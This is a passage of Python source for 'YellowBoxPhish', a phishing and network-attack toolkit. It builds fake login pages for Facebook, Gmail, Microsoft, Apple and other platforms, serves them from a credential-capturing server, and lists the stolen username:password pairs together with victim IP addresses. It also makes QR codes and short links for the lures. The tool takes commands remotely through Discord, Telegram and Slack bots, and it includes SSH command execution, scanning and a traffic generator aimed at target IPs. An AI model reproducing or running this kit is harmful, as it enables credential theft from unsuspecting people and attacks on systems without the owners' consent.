.logo{{font-size:32px;text-align:center;margin-bottom:20px;color:#FFD700}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}}
button{{width:100%;padding:12px;background:linear-gradient(135deg,#FFD700 0%,#FFA500 100%);color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px}}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">🐠 {platform}</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(
            link_id, 
            link_data['platform'], 
            link_data['html'], 
            port,
            link_data.get('qr_path')
        )
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.bot = None
        self.running = False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('discord', {}).get('token'):
            return False
        
        token = self.config['discord']['token']
        prefix = self.config['discord'].get('prefix', '!')
        
        intents = discord.Intents.default()
        intents.message_content = True
        
        self.bot = commands.Bot(command_prefix=prefix, intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(prefix):
                cmd = message.content[len(prefix):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(
                    title="🐠 YellowBoxPhish Response",
                    description=f"```{output}```",
                    color=0xFFD700
                )
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['discord']['token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.client = None
        self.running = False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('telegram', {}).get('api_id'):
            return False
        
        api_id = self.config['telegram']['api_id']
        api_hash = self.config['telegram']['api_hash']
        
        self.client = TelegramClient('yellowbox_session', api_id, api_hash)
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                output = result.get('output', '')[:4000]
                await event.reply(
                    f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_", 
                    parse_mode='markdown'
                )
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config['telegram'].get('bot_token'))
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.client = None
        self.running = False
        self.last_ts = {}
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('slack', {}).get('bot_token'):
            return False
        
        self.client = WebClient(token=self.config['slack']['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('slack', {}).get('channel_id', 'general')
        prefix = self.config.get('slack', {}).get('prefix', '!')
        
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(prefix):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][len(prefix):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# =====================
# WHATSAPP BOT
# =====================
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.driver = None
        self.running = False
    
    def setup(self) -> bool:
        if not SELENIUM_AVAILABLE:
            return False
        if not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + WHATSAPP_SESSION_DIR)
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            self.running = True
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")

# =====================
# SIGNAL BOT (Webhook-based)
# =====================
class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.running = False
        self.webhook_url = None
    
    def setup(self) -> bool:
        if not self.config.get('signal', {}).get('webhook_url'):
            return False
        self.webhook_url = self.config['signal']['webhook_url']
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        # For Signal, we use a webhook approach
        # This would typically involve setting up a webhook server
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    
    def send_message(self, message: str):
        try:
            payload = {'message': message}
            response = requests.post(self.webhook_url, json=payload, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Signal message error: {e}")
            return False

# =====================
# IMESSAGE BOT
# =====================
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager, config: Dict):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.running = False
    
    def setup(self) -> bool:
        if not IMESSAGE_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    
    def send_message(self, phone: str, message: str):
        try:
            script = f'tell application "Messages" to send "{message}" to buddy "{phone}"'
            subprocess.run(['osascript', '-e', script], timeout=10)
            return True
        except:
            return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            # Time Commands
            'time': self._execute_time,
            'date': self._execute_date,
            'datetime': self._execute_datetime,
            'history': self._execute_history,
            
            # SSH Commands
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_disconnect': self._execute_ssh_disconnect,
            
            # Network Commands
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'traceroute': self._execute_traceroute,
            'whois': self._execute_whois,
            'dns': self._execute_dns,
            'location': self._execute_location,
            
            # System Commands
            'system': self._execute_system,
            'status': self._execute_status,
            'threats': self._execute_threats,
            'report': self._execute_report,
            
            # IP Management
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            'ip_info': self._execute_ip_info,
            
            # Traffic Generation
            'generate_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            'traffic_logs': self._execute_traffic_logs,
            'traffic_help': self._execute_traffic_help,
            
            # Nikto Scanner
            'nikto': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            'nikto_ssl': self._execute_nikto_ssl,
            'nikto_status': self._execute_nikto_status,
            'nikto_results': self._execute_nikto_results,
            
            # Phishing Commands
            'phish': self._execute_phish,
            'phish_facebook': lambda args: self._execute_phish_platform(args, 'facebook'),
            'phish_instagram': lambda args: self._execute_phish_platform(args, 'instagram'),
            'phish_twitter': lambda args: self._execute_phish_platform(args, 'twitter'),
            'phish_gmail': lambda args: self._execute_phish_platform(args, 'gmail'),
            'phish_linkedin': lambda args: self._execute_phish_platform(args, 'linkedin'),
            'phish_microsoft': lambda args: self._execute_phish_platform(args, 'microsoft'),
            'phish_google': lambda args: self._execute_phish_platform(args, 'google'),
            'phish_apple': lambda args: self._execute_phish_platform(args, 'apple'),
            'generate_phish': self._execute_generate_phish,
            'phishing_start': self._execute_phishing_start,
            'phishing_stop': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            
            # Help
            'help': self._execute_help
        }
    
    def execute(self, command: str, source: str = "local", sender: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}"}
        else:
            result = self._execute_generic(command)
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, source, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    # ==================== TIME COMMANDS ====================
    def _execute_time(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"🕐 {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}"}
    
    def _execute_date(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}"}
    
    def _execute_datetime(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}\n🕐 {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}"}
    
    def _execute_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "\n".join([f"{h['timestamp'][:19]} - {h['command'][:50]}" for h in history])
        return {'success': True, 'output': output}
    
    # ==================== SSH COMMANDS ====================
    def _execute_ssh_add(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password] [port]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        result = self.ssh.add_server(name, host, username, password, None, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_list(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': 'No SSH servers configured'}
        output = "🔌 SSH Servers:\n"
        for s in servers:
            status = "🟢" if s.get('connected') else "⚪"
            output += f"{status} {s['name']} - {s['host']}:{s['port']} ({s['username']})\n"
        return {'success': True, 'output': output}
    
    def _execute_ssh_connect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id>'}
        result = self.ssh.connect(args[0])
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_exec(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
        server_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command)
        if result['success']:
            return {'success': True, 'output': result['output'] or 'Command executed successfully'}
        return {'success': False, 'output': result.get('error', 'Command failed')}
    
    def _execute_ssh_disconnect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return {'success': True, 'output': 'Disconnected' + (f' from {server_id}' if server_id else ' from all')}
    
    # ==================== NETWORK COMMANDS ====================
    def _execute_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        result = self.tools.ping(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(target, ports)
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_quick_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        return self._execute_scan([args[0], "1-1000"])
    
    def _execute_nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap_scan(target, options)
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois_lookup(args[0])
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain>'}
        result = subprocess.run(['dig', args[0], '+short'], capture_output=True, text=True)
        return {'success': result.returncode == 0, 'output': result.stdout or 'No records found'}
    
    def _execute_location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.get_ip_location(args[0])
        if result.get('success'):
            return {'success': True, 'output': f"📍 Location: {result.get('country')}, {result.get('city')}\nISP: {result.get('isp')}"}
        return {'success': False, 'output': result.get('error', 'Location lookup failed')}
    
    # ==================== SYSTEM COMMANDS ====================
    def _execute_system(self, args):
        info = f"🖥️ System: {platform.system()} {platform.release()}\n"
        info += f"💻 Hostname: {socket.gethostname()}\n"
        info += f"🔢 CPU: {psutil.cpu_percent()}%\n"
        info += f"💾 Memory: {psutil.virtual_memory().percent}%\n"
        info += f"💿 Disk: {psutil.disk_usage('/').percent}%"
        return {'success': True, 'output': info}
    
    def _execute_status(self, args):
        stats = self.db.get_statistics()
        status = f"🐠 YellowBoxPhish Status\n{'='*40}\n"
        status += f"🛡️ Threats: {stats.get('total_threats', 0)}\n"
        status += f"📝 Commands: {stats.get('total_commands', 0)}\n"
        status += f"🔌 SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
        status += f"📡 Traffic Tests: {stats.get('total_traffic_tests', 0)}\n"
        status += f"🎣 Phishing Links: {stats.get('total_phishing_links', 0)}\n"
        status += f"🔒 Managed IPs: {stats.get('total_managed_ips', 0)}\n"
        status += f"🚫 Blocked IPs: {stats.get('total_blocked_ips', 0)}\n"
        status += f"📧 Captured Credentials: {stats.get('captured_credentials', 0)}"
        return {'success': True, 'output': status}
    
    def _execute_threats(self, args):
        threats = self.db.get_recent_threats(10)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            output += f"  {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _execute_report(self, args):
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        report = f"🐠 YellowBoxPhish Security Report\n{'='*50}\n\n"
        report += f"📈 Statistics:\n"
        report += f"  Total Threats: {stats.get('total_threats', 0)}\n"
        report += f"  Total Commands: {stats.get('total_commands', 0)}\n"
        report += f"  SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
        report += f"  Managed IPs: {stats.get('total_managed_ips', 0)}\n"
        report += f"  Blocked IPs: {stats.get('total_blocked_ips', 0)}\n\n"
        if threats:
            report += f"🚨 Recent Threats:\n"
            for t in threats[:5]:
                report += f"  - {t['threat_type']} from {t['source_ip']}\n"
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    # ==================== IP MANAGEMENT ====================
    def _execute_add_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _execute_remove_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        if self.db.remove_managed_ip(ip):
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _execute_block_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = NetworkTools.block_ip_firewall(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _execute_unblock_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = NetworkTools.unblock_ip_firewall(ip)
        db_success = self.db.unblock_ip(ip, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _execute_list_ips(self, args):
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip.get('is_blocked') else "🟢"
            output += f"{status} {ip['ip_address']} - {ip.get('added_date', '')[:10]}\n"
        return {'success': True, 'output': output}
    
    def _execute_ip_info(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.get_ip_info(ip)
            location = self.tools.get_ip_location(ip)
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info.get('is_blocked') else '🟢 Active'}\n"
                output += f"📅 Added: {db_info.get('added_date', '')[:10]}\n"
                output += f"📝 Notes: {db_info.get('notes', 'None')}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    # ==================== TRAFFIC GENERATION ====================
    def _execute_generate_traffic(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            result = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s\nID: {result.get('generator_id', 'unknown')}"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_traffic_types(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic_gen.get_available_traffic_types()
        return {'success': True, 'output': "📡 Available Traffic Types:\n" + "\n".join([f"  • {t}" for t in types])}
    
    def _execute_traffic_status(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic_gen.get_active_generators()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "🚀 Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']}\n"
        return {'success': True, 'output': output}
    
    def _execute_traffic_stop(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic_gen.stop_generation(generator_id):
            return {'success': True, 'output': 'Traffic stopped' + (f' for {generator_id}' if generator_id else ' for all')}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _execute_traffic_logs(self, args):
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        logs = self.db.get_traffic_logs(limit)
        if not logs:
            return {'success': True, 'output': 'No traffic logs'}
        output = "📋 Traffic Logs:\n"
        for l in logs:
            output += f"  • {l['timestamp'][:19]} - {l['traffic_type']} to {l['target_ip']} ({l['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _execute_traffic_help(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic_gen.get_available_traffic_types()
        return {'success': True, 'output': 
            "📡 Traffic Generation Help\n\nAvailable Types:\n" + 
            "\n".join([f"  • {t}" for t in types]) +
            "\n\nUsage: generate_traffic <type> <ip> <duration> [port] [rate]\n" +
            "Example: generate_traffic icmp 192.168.1.1 10"}
    
    # ==================== NIKTO SCANNER ====================
    def _execute_nikto(self, args):
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto Scan Results for {target}\n{'='*40}\n"
            output += f"Vulnerabilities Found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:10]:
                output += f"  • {v['description'][:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f'Scan failed: {result.get("error", "Unknown error")}'}
    
    def _execute_nikto_full(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        return self._execute_nikto(args)
    
    def _execute_nikto_ssl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS Scan Results:\n{result['output'][:1000]}"}
        return {'success': False, 'output': f'SSL scan failed: {result.get("error")}'}
    
    def _execute_nikto_status(self, args):
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        status = f"🕷️ Nikto Scanner Status\n"
        status += f"  Available: {'✅' if self.nikto.nikto_available else '❌'}\n"
        if not self.nikto.nikto_available:
            status += "  Install: sudo apt-get install nikto (Linux) or brew install nikto (macOS)"
        return {'success': True, 'output': status}
    
    def _execute_nikto_results(self, args):
        scans = self.db.get_nikto_scans(10)
        if not scans:
            return {'success': True, 'output': 'No Nikto scans found'}
        output = "📊 Recent Nikto Scans:\n"
        for s in scans:
            vulns = json.loads(s.get('vulnerabilities', '[]')) if s.get('vulnerabilities') else []
            output += f"  • {s['timestamp'][:19]} - {s['target']} ({len(vulns)} vulns)\n"
        return {'success': True, 'output': output}
    
    # ==================== PHISHING COMMANDS ====================
    def _execute_phish(self, args):
        """Generate phishing link for specified platform"""
        platform = args[0] if args else 'facebook'
        return self._execute_phish_platform(args, platform)
    
    def _execute_phish_platform(self, args, platform):
        result = self.social_tools.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"URL: {result['phishing_url']}\n"
            if result.get('qr_path'):
                output += f"QR Code: {result['qr_path']}\n"
            if result.get('short_url'):
                output += f"Short URL: {result['short_url']}\n"
            output += f"\nUse: phishing_start {result['link_id']} to start the server"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Failed to generate link')}
    
    def _execute_generate_phish(self, args):
        """Generate custom phishing page with HTML"""
        if not args:
            return {'success': False, 'output': 'Usage: generate_phish <html_content>\nExample: generate_phish "<html><body><h1>Login</h1><form method=POST action=/capture><input name=username><input type=password name=password><button>Login</button></form></body></html>"'}
        
        html_content = ' '.join(args)
        result = self.social_tools.generate_phishing_link('custom', custom_html=html_content)
        if result['success']:
            output = f"🎣 Custom phishing page generated!\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"URL: {result['phishing_url']}\n"
            if result.get('qr_path'):
                output += f"QR Code: {result['qr_path']}\n"
            output += f"\nUse: phishing_start {result['link_id']} to start the server"
            output += f"\nHTML saved to: {CUSTOM_PHISHING_DIR}/{result['link_id']}.html"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Failed to generate custom phishing page')}
    
    def _execute_phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social_tools.start_phishing_server(link_id, port):
            url = self.social_tools.get_server_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}\nLink ID: {link_id}"}
        return {'success': False, 'output': f'Failed to start server for link {link_id}'}
    
    def _execute_phishing_stop(self, args):
        self.social_tools.stop_phishing_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _execute_phishing_status(self, args):
        running = self.social_tools.phishing_server.running
        url = self.social_tools.get_server_url() if running else None
        output = f"🎣 Phishing Server Status: {'✅ Running' if running else '❌ Stopped'}"
        if running:
            output += f"\n   URL: {url}"
        return {'success': True, 'output': output}
    
    def _execute_phishing_links(self, args):
        links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        output = f"🎣 Phishing Links ({len(all_links)} total)\n"
        for l in all_links[:10]:
            active = '🟢' if any(al['link_id'] == l['id'] for al in links) else '⚪'
            output += f"  {active} {l['id'][:8]} - {l['platform']} ({l['clicks']} clicks)"
            if l.get('short_url'):
                output += f" - {l['short_url']}"
            output += "\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No credentials captured'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_qr(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
        link_id = args[0]
        link = self.db.get_phishing_link(link_id)
        if not link:
            return {'success': False, 'output': f'Link {link_id} not found'}
        if link.get('qr_path') and os.path.exists(link['qr_path']):
            return {'success': True, 'output': f"QR Code path: {link['qr_path']}"}
        return {'success': False, 'output': 'QR code not available'}
    
    def _execute_phishing_shorten(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_shorten <link_id>'}
        link_id = args[0]
        link = self.db.get_phishing_link(link_id)
        if not link:
            return {'success': False, 'output': f'Link {link_id} not found'}
        if link.get('short_url'):
            return {'success': True, 'output': f"Short URL: {link['short_url']}"}
        return {'success': False, 'output': 'Short URL not available'}
    
    # ==================== HELP ====================
    def _execute_help(self, args):
        help_text = f"""
{Colors.YELLOW}🐠 YELLOW_BOX_PHISH v2.0.0 - HELP MENU{Colors.RESET}
{Colors.GREEN}{'='*50}{Colors.RESET}

